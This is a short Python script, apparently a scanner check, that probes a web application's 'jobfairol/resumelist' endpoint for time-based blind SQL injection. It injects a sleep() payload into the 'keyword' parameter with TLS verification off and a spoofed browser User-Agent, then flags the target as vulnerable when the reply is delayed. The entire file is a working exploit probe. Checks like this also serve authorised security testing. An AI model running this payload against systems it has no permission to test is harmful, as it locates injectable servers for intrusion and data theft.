import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
randJobfair=randomInt(1, 10)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
randSecond=randomInt(2, 4)
def doCheck(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"v1_0/home/jobfairol/resumelist?jobfair_id="+str(randJobfair)+"&keyword=%27%2B(select(sleep("+str(randSecond)+")))%2B%27)%23"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.elapsed.total_seconds() >= randSecond and response.status_code == 200 and "{\"code\":200" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
